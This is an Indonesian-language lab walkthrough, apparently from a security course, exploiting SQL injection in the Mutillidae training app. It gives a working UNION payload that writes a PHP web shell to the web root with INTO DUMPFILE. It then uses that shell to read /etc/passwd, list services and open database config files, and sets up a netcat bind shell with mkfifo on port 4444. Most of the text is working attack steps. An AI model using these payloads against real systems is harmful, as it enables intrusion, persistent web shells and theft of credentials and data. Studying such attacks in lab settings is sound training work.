# SQL Injection Union Exploit #3 (Create PHP Execution Script)

1. Masuk ke halaman sqli user info dengan cara klik menu pada sidebar kiri ```Owasp Top 10 -> A1 - Injection -> SQLi - Extract Data -> User Info```
![1](/lesson10/1.png)

2. Lakukan inspect element pada kolom ```name``` lalu ubahlah sizenya menjadi 100 ```size="100"```. lalu masukkanlah kode sqli union dengan OUTFILE execution script dengan query:
```
' union select null,null,null,null,'<form action="" method="post" enctype="application/x-www-form-urlencoded"><input type="text" name="CMD" size="50"><input type="submit" value="Execute Command" /></form><?php echo "<pre>";echo shell_exec($_REQUEST["CMD"]);echo "</pre>"; ?>' INTO DUMPFILE '/var/www/mutillidae/execute_command.php' --
```
![1](/lesson10/2.png)

3. Setelah itu ketikkan pada url
```
http://10.151.36.156/mutillidae/execute_command
```
maka akan muncul sebuah halaman untuk mengexecute command linux.
![1](/lesson10/3.png)

4. kita dapat coba untuk cek user yang sedang kita pakai dan sedang ada di direktori mana kita berada dengan mengetikkan
```
whoami;pwd
```
maka akan muncul respon seperti pada di gambar
![1](/lesson10/4.png)

5. untuk melihat siapa saja user yang sedang login, kita dapat menggunakan command
```
w
```
![1](/lesson10/5.png)

6. untuk melihat user yang terdaftar kita dapat menggunakan Command
```
cat /etc/passwd
```
![1](/lesson10/6.png)
user yang mempunya string nologin berpotensi untuk diserang

7. untuk melihat service dan port yang sedang berjalan kita dapat menggunakan command
```
netstat -nao | grep "0.0.0.0:"
```
![1](/lesson10/7.png)

8. untuk melihat konfigurasi database, kita dapat melihat isi dari config.inc dengan melakukan ls (list directory) dan melihat disitu ada file ```config.inc``` yang bisa dibuka lewat url pada browser.
 * ![1](/lesson10/8.png)
 * ![1](/lesson10/9.png)

9. Selanjutnya kita akan melakukan shell exploitation dengan memasukkan command netcat untuk melakukan listen pada port tertentu
```
mkfifo /tmp/pipe;sh /tmp/pipe | nc -l -p 4444 > /tmp/pipe
```
![1](/lesson10/10.png)

10. Untuk mengaksesnya, kita buka terminal dan mengakses port tersebut dengan netcat
```
nc 10.151.36.156 4444
```
![1](/lesson10/11.png)
